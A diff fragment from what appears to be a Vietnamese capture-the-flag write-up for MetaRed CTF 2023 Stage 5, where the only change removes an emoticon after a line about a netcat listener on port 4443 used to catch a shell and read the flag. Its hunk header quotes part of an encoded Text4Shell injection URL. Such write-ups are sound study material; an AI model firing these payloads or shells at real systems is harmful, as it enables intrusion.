@@ -16,7 +16,7 @@ payload encode url: xx(http)://190.15.135.60/text4shell/attack?search=%24{script
 
 <img src="/assets/writeup/cookie/MetaRed CTF 2023 - Stage 5 e42a378f8c09464288274c527d70a42a/Untitled 1.png">
 
-- `nc -lvnp 4443` : kết nối vào port 4443, sau đó lấy flag ^^ ^^
+- `nc -lvnp 4443` : kết nối vào port 4443, sau đó lấy flag ^^
 
 # WEB-WordPress
 
